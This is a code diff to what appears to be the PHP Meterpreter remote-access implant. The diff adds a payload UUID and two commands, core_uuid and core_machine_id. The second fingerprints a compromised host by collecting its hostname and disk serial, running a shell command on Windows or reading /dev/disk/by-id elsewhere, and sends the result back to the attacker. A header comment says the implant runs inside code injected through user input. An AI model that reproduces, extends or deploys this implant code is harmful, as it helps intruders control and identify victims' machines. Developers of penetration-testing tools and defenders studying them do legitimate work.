@@ -1,4 +1,4 @@
-#<?php
+//<?php
 
 # Everything that needs to be global has to be made so explicitly so we can run
 # inside a call to create_user_func($user_input);
@@ -32,7 +32,7 @@ if (!isset($GLOBALS['readers'])) {
 
 # global list of extension commands
 if (!isset($GLOBALS['commands'])) {
-    $GLOBALS['commands'] = array("core_loadlib");
+    $GLOBALS['commands'] = array("core_loadlib", "core_machine_id", "core_uuid");
 }
 
 function register_command($c) {
@@ -99,18 +99,21 @@ function socket_set_option($sock, $type, $opt, $value) {
 }
 }
 
+#
+# Payload definitions
+#
+define("PAYLOAD_UUID", "");
 
 #
 # Constants
 #
-define("PACKET_TYPE_REQUEST",0);
-define("PACKET_TYPE_RESPONSE",1);
-define("PACKET_TYPE_PLAIN_REQUEST", 10);
+define("PACKET_TYPE_REQUEST",         0);
+define("PACKET_TYPE_RESPONSE",        1);
+define("PACKET_TYPE_PLAIN_REQUEST",  10);
 define("PACKET_TYPE_PLAIN_RESPONSE", 11);
 
-define("ERROR_SUCCESS",0);
-# not defined in original C implementation
-define("ERROR_FAILURE",1);
+define("ERROR_SUCCESS", 0);
+define("ERROR_FAILURE", 1);
 
 define("CHANNEL_CLASS_BUFFERED", 0);
 define("CHANNEL_CLASS_STREAM",   1);
@@ -174,6 +177,9 @@ define("TLV_TYPE_LIBRARY_PATH",        TLV_META_TYPE_STRING | 400);
 define("TLV_TYPE_TARGET_PATH",         TLV_META_TYPE_STRING | 401);
 define("TLV_TYPE_MIGRATE_PID",         TLV_META_TYPE_UINT   | 402);
 define("TLV_TYPE_MIGRATE_LEN",         TLV_META_TYPE_UINT   | 403);
+
+define("TLV_TYPE_MACHINE_ID",          TLV_META_TYPE_STRING | 460);
+define("TLV_TYPE_UUID",                TLV_META_TYPE_RAW    | 461);
 
 define("TLV_TYPE_CIPHER_NAME",         TLV_META_TYPE_STRING | 500);
 define("TLV_TYPE_CIPHER_PARAMETERS",   TLV_META_TYPE_GROUP  | 501);
@@ -419,8 +425,41 @@ function core_loadlib($req, &$pkt) {
 }
 
 
+function core_uuid($req, &$pkt) {
+    my_print("doing core_uuid");
+    packet_add_tlv($pkt, create_tlv(TLV_TYPE_UUID, PAYLOAD_UUID));
+    return ERROR_SUCCESS;
+}
 
 
+function get_hdd_label() {
+  foreach (scandir('/dev/disk/by-id/') as $file) {
+    foreach (array("ata-", "mb-") as $prefix) {
+      if (strpos($file, $prefix) === 0) {
+        return substr($file, strlen($prefix));
+      }
+    }
+  }
+  return "";
+}
+
+function core_machine_id($req, &$pkt) {
+  my_print("doing core_machine_id");
+  $machine_id = gethostname();
+  $serial = "";
+
+  if (is_windows()) {
+    # It's dirty, but there's not really a nicer way of doing this on windows. Make sure
+    # it's lowercase as this is what the other meterpreters use.
+    $output = strtolower(shell_exec("vol %SYSTEMDRIVE%"));
+    $serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output);
+  } else {
+    $serial = get_hdd_label();
+  }
+
+  packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.":".$machine_id));
+  return ERROR_SUCCESS;
+}
 
 
 ##
